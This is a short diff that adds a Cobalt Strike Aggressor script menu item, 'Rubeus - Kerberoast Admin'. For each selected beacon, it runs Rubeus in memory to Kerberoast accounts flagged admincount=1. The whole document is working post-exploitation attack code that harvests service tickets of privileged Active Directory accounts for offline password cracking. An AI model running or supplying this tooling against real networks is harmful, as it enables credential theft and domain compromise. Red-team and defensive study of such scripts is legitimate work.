@@ -1,0 +1,12 @@
+item "Rubeus - Kerberoast Admin"{
+			local('$bid');
+				foreach $bid ($1){
+					kerberoastadmin($bid);
+				}
+			}
+			
+			
+			
+sub kerberoastadmin{
+bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "kerberoast /ldapfilter:'admincount=1'");
+}			
